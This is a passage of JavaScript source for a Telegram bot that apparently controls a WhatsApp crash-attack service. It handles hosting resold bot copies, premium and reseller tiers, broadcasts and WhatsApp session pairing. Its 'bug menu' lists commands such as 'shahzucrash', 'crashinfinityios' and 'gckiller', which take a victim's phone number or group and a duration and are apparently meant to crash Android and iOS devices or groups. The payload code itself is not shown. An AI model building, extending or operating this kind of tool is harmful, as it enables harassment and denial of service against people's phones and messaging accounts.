            if (!value) return S7.sendMessage(chatId, `❌ Contact missing.\n\nEx: <code>/setbot contact @shahzu_404</code>`, { parse_mode: 'HTML' });
            botData.config.ownerContact = value;
        } else if (type === 'protection') {
            const state = value.toLowerCase();
            if (state !== 'on' && state !== 'off') return S7.sendMessage(chatId, `❌ Use: /setbot protection on/off`);
            botData.config.protectionState = state === 'on';
        } else {
            return S7.sendMessage(chatId, `❌ Invalid setting: <code>${escapeHTML(type)}</code>\n\n${setBotHelp()}`, { parse_mode: 'HTML' });
        }

        saveDB(db);

        await S7.sendMessage(
            chatId,
            `╭━━━〔 ✅ Bᴏᴛ Uᴘᴅᴀᴛᴇᴅ 〕━━━╮\n┃ ⚙️ Sᴇᴛᴛɪɴɢ: <code>${escapeHTML(type)}</code>\n┃ 🤖 Bᴏᴛ: ${escapeHTML(botData.config.botName || 'Hosted Bot')}\n╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n💾 Configuration saved.\n🔄 Restarting Bot...`,
            { parse_mode: 'HTML' }
        );

        if (activeBots[botData.token]) {
            try { await activeBots[botData.token].stopPolling(); } catch (error) { console.log('[SetBot] Stop Error:', error.message); }
            delete activeBots[botData.token];
        }

        await new Promise(resolve => setTimeout(resolve, 1000));

        try {
            startSYloveBot(botData.token);
            await S7.sendMessage(chatId, `╭━━━〔 🟢 Bᴏᴛ Oɴʟɪɴᴇ 〕━━━╮\n┃ ✅ Configuration Applied\n┃ 🤖 Bot Restarted\n╰━━━━━━━━━━━━━━━━━━━━━━╯`, { parse_mode: 'HTML' });
        } catch (error) {
            await S7.sendMessage(chatId, `⚠️ Config saved, but restart failed.\n\nError: <code>${escapeHTML(error.message)}</code>`, { parse_mode: 'HTML' });
        }

    } catch (error) {
        console.error('[SetBot Error]', error);
        S7.sendMessage(chatId, `❌ <b>Error</b>\n<code>${escapeHTML(error.message)}</code>`, { parse_mode: 'HTML' });
    }
});


SYLoVe('addbot', async (msg) => {
    const chatId = String(msg.chat.id);

    try {
        let db = getDB();

        const userBots = db.tokens.filter(bot => String(bot.owner) === chatId);

        if (userBots.length >= 1) {
            return S7.sendMessage(chatId, `╭━━━〔 ⚠️ Lɪᴍɪᴛ 〕━━━╮\n┃ You can host only 1 bot.\n╰━━━━━━━━━━━━━━━━━━╯\n\nUse <code>/delbot</code> first.`, { parse_mode: 'HTML' });
        }

        const messageText = (msg.text || '').trim();
        const args = messageText.split(/\s+/);
        const newToken = args[1];

        if (!newToken) {
            return S7.sendMessage(chatId, `╭━━━〔 🤖 Aᴅᴅ Bᴏᴛ 〕━━━╮\n┃ Usage:\n┃ <code>/addbot YOUR_BOT_TOKEN</code>\n╰━━━━━━━━━━━━━━━━━━━━╯`, { parse_mode: 'HTML' });
        }

        if (!/^\d+:[A-Za-z0-9_-]{20,}$/.test(newToken)) {
            return S7.sendMessage(chatId, `❌ <b>Invalid Bot Token</b>\nCheck the token from BotFather.`, { parse_mode: 'HTML' });
        }

        const alreadyHosted = db.tokens.find(bot => String(bot.token) === String(newToken));
        if (alreadyHosted) {
            return S7.sendMessage(chatId, '❌ This bot is already hosted.', { parse_mode: 'HTML' });
        }

        const tempBot = new SY(newToken, { polling: false });
        let botInfo;

        try {
            botInfo = await tempBot.getMe();
        } catch (error) {
            return S7.sendMessage(chatId, `❌ <b>Token Verification Failed</b>\nTelegram did not accept this token.`, { parse_mode: 'HTML' });
        }

        const defaultConfig = {
            channel: config.channel || '',
            group: config.group || '',
            video: config.video || '',
            botName: botInfo.first_name || 'Hosted Bot',
            ownerContact: config.ownerContact || '',
            protectionState: false
        };

        db.tokens.push({
            token: newToken,
            owner: chatId,
            username: botInfo.username || '',
            botId: botInfo.id || null,
            config: defaultConfig,
            createdAt: new Date().toISOString()
        });

        saveDB(db);

        try {
            startSYloveBot(newToken);
        } catch (error) {
            db = getDB();
            db.tokens = db.tokens.filter(bot => bot.token !== newToken);
            saveDB(db);
            throw error;
        }

        await S7.sendMessage(
            chatId,
            `╭━━━〔 🟢 Bᴏᴛ Hᴏsᴛᴇᴅ 〕━━━╮\n┃ 🤖 <b>Name:</b> ${escapeHTML(botInfo.first_name || 'Unknown')}\n┃ 👤 <b>Username:</b> @${escapeHTML(botInfo.username || 'unknown')}\n┃ 🆔 <b>Bot ID:</b> <code>${botInfo.id}</code>\n╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n✅ Your bot has been hosted.\n\n<b>📌 Next Steps</b>\n1️⃣ Add bot as <b>Admin</b> to required channel/group\n2️⃣ Customize: <code>/setbot</code>`,
            { parse_mode: 'HTML' }
        );

    } catch (error) {
        console.error('[AddBot Error]', error);
        S7.sendMessage(chatId, `❌ <b>Error</b>\n<code>${escapeHTML(error.message)}</code>`, { parse_mode: 'HTML' });
    }
});


SYLoVe('delbot', async (msg) => {
    const chatId = String(msg.chat.id);

    try {
        let db = getDB();

        const botData = getHostedBot(db, chatId);

        if (!botData) {
            return S7.sendMessage(chatId, `╭━━━〔 ❌ Nᴏ Bᴏᴛ 〕━━━╮\n┃ You do not have a hosted bot.\n╰━━━━━━━━━━━━━━━━━━╯\n\nUse: <code>/addbot TOKEN</code>`, { parse_mode: 'HTML' });
        }

        const botToken = botData.token;
        const botName = botData.config?.botName || 'Hosted Bot';

        if (activeBots[botToken]) {
            try { await activeBots[botToken].stopPolling(); } catch (error) { console.log('[DelBot] Stop Error:', error.message); }
            delete activeBots[botToken];
        }

        db.tokens = db.tokens.filter(
            bot => !(String(bot.owner) === chatId && String(bot.token) === String(botToken))
        );

        saveDB(db);

        const userAuthPath = path.join('./Love', chatId);
        if (fs.existsSync(userAuthPath)) {
            try { fs.rmSync(userAuthPath, { recursive: true, force: true }); } catch (error) { console.log('[DelBot] Cleanup Error:', error.message); }
        }

        await S7.sendMessage(
            chatId,
            `╭━━━〔 🗑️ Bᴏᴛ Dᴇʟᴇᴛᴇᴅ 〕━━━╮\n┃ 🤖 <b>Bot:</b> ${escapeHTML(botName)}\n╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n✅ Bot removed successfully.`,
            { parse_mode: 'HTML' }
        );

    } catch (error) {
        console.error('[DelBot Error]', error);
        S7.sendMessage(chatId, `❌ <b>Error</b>\n<code>${escapeHTML(error.message)}</code>`, { parse_mode: 'HTML' });
    }
});
        SYLoVe('state', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            const args = msg.text.split(' ');
            const value = args[1];
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }

            if (Number(chatId) !== Number(config.adminId)) {
                return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
            }

            if (value !== '0' && value !== '1') {
                return S7.sendMessage(chatId, 'Usage: /state 0 | 1');
            }

            let db = getDB();
            db.state = Number(value);
            saveDB(db);

            S7.sendMessage(
                chatId,
                value === '0'
                    ? '✅ State set to FREE MODE (All users allowed)'
                    : '🔒 State set to PREMIUM ONLY MODE'
            );
        });


        SYLoVe('listuser', (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();
            
            if (!LoveGlobalState(userId)) {
                return sendSYLove(S7, chatId);
            }
            
            if (Number(chatId) !== Number(config.adminId)) {
                return S7.sendMessage(msg.chat.id, '🚫 You are not authorized to use this command.');
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) return S7.sendMessage(msg.chat.id, 'No users found.');

            const users = JSON.parse(fs.readFileSync(userFile));
            let list = 'User List:\n\n';
            users.forEach((u, i) => {
                list += `${i + 1}. ${u.name} (${u.id})\n`;
            });

            if (list.length > 4000) {
                const listPath = path.join(LoveDir, 'list.txt');
                fs.writeFileSync(listPath, list);
                S7.sendDocument(msg.chat.id, listPath);
            } else {
                S7.sendMessage(msg.chat.id, list);
            }
        });


        SYLoVe('broadcast', async (msg) => {
            const chatId = msg.chat.id.toString();
            const userId = msg.from.id.toString();

            if (userId !== config.adminId.toString()) {
                return S7.sendMessage(chatId, '🚫 You are not authorized to use this command.');
            }

            const broadcastText = msg.text
                .trim()
                .replace(/^\/broadcast(?:@\w+)?(?:\s+|$)/i, '')
                .trim();

            if (!broadcastText) {
                return S7.sendMessage(chatId, 'Usage: /broadcast Your message here');
            }

            if (broadcastText.length > 4096) {
                return S7.sendMessage(chatId, '❌ Message is too long. Telegram allows up to 4096 characters.');
            }

            const userFile = path.join(LoveDir, 'user.json');
            if (!fs.existsSync(userFile)) {
                return S7.sendMessage(chatId, '❌ No registered users found.');
            }

            let users;
            try {
                users = JSON.parse(fs.readFileSync(userFile, 'utf8'));
            } catch (error) {
                log('error', 'BROADCAST', `Could not read user list: ${error.message}`);
                return S7.sendMessage(chatId, '❌ Could not read the registered user list.');
            }

            const recipientIds = [
                ...new Set(
                    (Array.isArray(users) ? users : [])
                        .map(user => user?.id)
                        .filter(id => id !== undefined && id !== null)
                        .map(id => id.toString())
                )
            ];

            if (recipientIds.length === 0) {
                return S7.sendMessage(chatId, '❌ No registered users found.');
            }

            await S7.sendMessage(
                chatId,
                `📢 Broadcast started for ${recipientIds.length} users...`
            );

            let sent = 0;
            let failed = 0;

            for (const recipientId of recipientIds) {
                let delivered = false;

                for (let attempt = 0; attempt < 2 && !delivered; attempt++) {
                    try {
                        await S7.sendMessage(recipientId, broadcastText, {
                            disable_web_page_preview: true
                        });
                        delivered = true;
                        sent++;
                    } catch (error) {
                        const retryAfter = Number(
                            error?.response?.body?.parameters?.retry_after
                        );

                        if (
                            attempt === 0 &&
                            Number.isFinite(retryAfter) &&
                            retryAfter > 0 &&
                            retryAfter <= 60
                        ) {
                            await new Promise(resolve =>
                                setTimeout(resolve, retryAfter * 1000)
                            );
                        } else {
                            failed++;
                            log(
                                'error',
                                'BROADCAST',
                                `Failed for ${recipientId}: ${error.message}`
                            );
                        }
                    }
                }

                await new Promise(resolve => setTimeout(resolve, 45));
            }

            return S7.sendMessage(
                chatId,
                `✅ Broadcast completed.\n\n📨 Sent: ${sent}\n❌ Failed: ${failed}`
            );
        });


        S7.on('callback_query', async (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const data = query.data;
            const userId = query.from.id;
            const name = query.from.username ? `@${query.from.username}` : query.from.first_name;
            const uptime = getRuntime();
            const love = userId.toString();

            const S7edit = (text, opts) => {
                S7.editMessageCaption(text, opts).catch((err) => {
                    if (!err.message.includes('message is not modified')) {
                        log('error', 'SYSTEM', err.message);
                    }
                });
            };


            if (data === 'check_membership') {
                S7.deleteMessage(chatId, messageId).catch(() => {});
                S7.sendMessage(chatId, `✅ <b>You have full access!</b>\nUse /start to begin.`, { parse_mode: 'HTML' });
            }


            if (data === 'misc_menu') {
                const chatId2 = query.message.chat.id;
                const userId2 = query.from.id.toString();
                const love2 = query.from.id.toString();

                const miscText = MainSYLoVe(name, uptime, love2) + `

<b>┌──────┤ 𝐌𝐈𝐒𝐂 𝐌𝐄𝐍𝐔 ├──────┐</b>

<b>➻⪩⧼ 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐒𝐄𝐒𝐒𝐈Ⓞ𝐍 ⧽⪨</b>
➻ reqpair number
➻ delpair number

<b>➻⪩⧼ 𝐓Ⓞ𝐊𝐄𝐍 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 ⧽⪨</b>
➻ addtoken token
➻ deltoken token
➻ mytoken

<b>➻⪩⧼ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 ⧽⪨</b>
➻ addprem ID
➻ delprem ID
➻ listprem

<b>➻⪩⧼ 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓 ⧽⪨</b>
➻ addresell ID
➻ delresell ID
➻ listresell

<b>➻⪩⧼ 𝐎𝐓𝐇𝐄𝐑 𝐂Ⓞ𝐌𝐌𝐀𝐍𝐃𝐒 ⧽⪨</b>
➻ listuser
➻ broadcast message
➻ state 0 | 1

<b>➻⪩⧼ 𝐌𝐀𝐊𝐄 𝐘𝐎𝐔𝐑 𝐁𝐎𝐓 ⧽⪨</b>
➻ addbot
➻ delbot
➻ setbot

<b>└──────────────────────┘</b>
`;

                S7edit(miscText, {
                    chat_id: chatId2,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    ...Lovesbutton
                });
            }


            if (data === 'bug_menu') {
                const chatId2 = query.message.chat.id;
                const userId2 = query.from.id.toString();
                const love2 = query.from.id.toString();

                const bugText = MainSYLoVe(name, uptime, love2) + `

<b>┌──────┤ 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔 ├──────┐</b>

<b>➻⪩⧼ 𝐀𝐍𝐃𝐑ⓞ𝐈𝐃  𝐁𝐔𝐆 ⧽⪨</b>
➻ shahzucrash ɴᴜᴍ ᴛɪᴍᴇ
➻ crashforever ɴᴜᴍ ᴛɪᴍᴇ
➻ pendingv2 ɴᴜᴍ ᴛɪᴍᴇ
➻ pendingmix ɴᴜᴍ ᴛɪᴍᴇ
➻ crashmaker ɴᴜᴍ ᴛɪᴍᴇ
➻ crashhome ɴᴜᴍ ᴛɪᴍᴇ

<b>➻⪩⧼ 𝐈Ⓞ𝐒 𝐁Ⓥ𝐆 ⧽⪨</b>
➻ cantsee ɴᴜᴍ ᴛɪᴍᴇ
➻ crashinfinityios ɴᴜᴍ ᴛɪᴍᴇ
➻ crashinfinityios1 ɴᴜᴍ ᴛɪᴍᴇ
➻ crashinfinityios2 ɴᴜᴍ ᴛɪᴍᴇ
➻ crashinfinityios3 ɴᴜᴍ ᴛɪᴍᴇ
➻ iosnova ɴᴜᴍ ᴛɪᴍᴇ

<b>➻⪩⧼ 𝐆𝐑Ⓞ𝐔𝐏 𝐁Ⓤ𝐆 ⧽⪨</b>
➻ gckiller ɢᴄ ᴛɪᴍᴇ
➻ andforce ɢᴄ ᴛɪᴍᴇ
➻ listgc ɢᴄ ɪᴅ

<b>└──────────────────────┘</b>
                `;
                S7edit(bugText, {
                    chat_id: chatId2,
                    message_id: messageId,
                    parse_mode: 'HTML',
                    ...Lovesbutton
                });
            }
        });

    } catch (err) {
        log('error', 'STARTUP', `Could not start bot with token: ${token.substring(0, 10)}...`);
    }
}

// Start SYLove Bot
if (!config.mainToken) {
    console.error(
        'Missing TELEGRAM_BOT_TOKEN. Set it in the environment before starting the bot.'
    );
    process.exit(1);
}

startSYloveBot(config.mainToken);

// Start Extra Bots
const db = getDB();
if (db.tokens && db.tokens.length > 0) {
    db.tokens.forEach(obj => {
        startSYloveBot(obj.token);
    });
} else {
    log('info', null, 'No extra bots found in database.');
                      }
